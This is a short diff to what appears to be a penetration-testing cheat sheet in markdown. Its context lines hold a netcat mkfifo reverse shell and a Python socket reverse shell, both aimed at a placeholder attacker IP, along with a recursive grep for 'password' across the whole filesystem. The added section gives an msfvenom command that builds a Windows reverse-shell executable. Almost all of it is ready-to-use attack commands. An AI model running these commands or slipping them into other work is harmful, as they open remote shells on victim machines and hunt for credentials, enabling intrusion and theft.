@@ -54,6 +54,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacker IP> <Port> >/tmp
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("< IP>", < Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
+### Windows reverse shell
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /path/to/payload/file
+```
+
 ---
 
 ## Shell Stabilization
@@ -98,3 +104,4 @@ grep -Ri "password" / 2>/dev/null
 ```
 
 ---
+
